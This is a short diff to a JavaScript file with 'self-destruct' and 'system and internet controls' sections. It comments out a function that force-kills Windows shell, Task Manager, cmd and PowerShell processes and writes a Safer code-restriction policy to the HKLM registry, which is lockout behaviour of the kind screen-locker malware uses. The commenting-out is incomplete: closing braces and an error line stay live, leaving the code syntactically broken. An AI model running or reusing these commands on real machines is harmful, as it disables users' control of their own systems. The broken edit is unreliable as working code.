@@ -100,14 +100,14 @@ function scheduleSelfDestructOnExit() {
 }
 
 // ─── System and internet controls ──────────────────────────────
-function disableSystemProcesses() {
-  if (testMode) { testSpies.disableSystemProcesses++; return; }
-  console.log('🔒 Disabling system processes...');
-  const procs = ['explorer.exe', 'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'notepad.exe'];
-  procs.forEach(p => {
-    exec(`taskkill /f /im ${p}`, (err) => { if (err) console.warn(`Could not kill ${p}:`, err); });
+//function disableSystemProcesses() {
+//  if (testMode) { testSpies.disableSystemProcesses++; return; }
+//  console.log('🔒 Disabling system processes...');
+//  const procs = ['explorer.exe', 'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'notepad.exe'];
+//  procs.forEach(p => {
+//    exec(`taskkill /f /im ${p}`, (err) => { if (err) console.warn(`Could not kill ${p}:`, err); });
   });
-  exec('reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers" /v DefaultLevel /t REG_DWORD /d 262144 /f', (err) => {
+//  exec('reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers" /v DefaultLevel /t REG_DWORD /d 262144 /f', (err) => {
     if (err) console.warn('Failed to set policy:', err);
   });
 }
